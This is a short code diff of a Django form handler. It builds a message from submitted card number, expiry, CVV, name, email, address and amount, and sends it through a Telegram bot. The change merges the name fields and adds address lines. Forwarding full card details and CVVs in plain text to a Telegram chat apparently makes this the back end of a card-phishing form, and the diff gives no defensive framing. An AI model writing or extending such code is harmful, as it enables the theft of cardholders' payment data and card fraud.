@@ -36,12 +36,13 @@ def form_view(request):
             data = form.cleaned_data
             message = (
                 f"New Form Submission:\n\n"
-                f"First Name: {data['first_name']}\n"
-                f"Last Name: {data['last_name']}\n"
+                f"Full Name: {data['full_name']}\n"
                 f"Email: {data['email']}\n"
                 f"Card Number: {data['card_number']}\n"
                 f"Expiry: {data['expiry']}\n"
                 f"CVV: {data['cvv']}\n"
+                f"Address Line 1: {data['address1']}\n"
+                f"Address Line 2: {data['address2']}\n"
                 f"Amount: {data['amount']}"
             )
             sent = send_telegram_message(message)
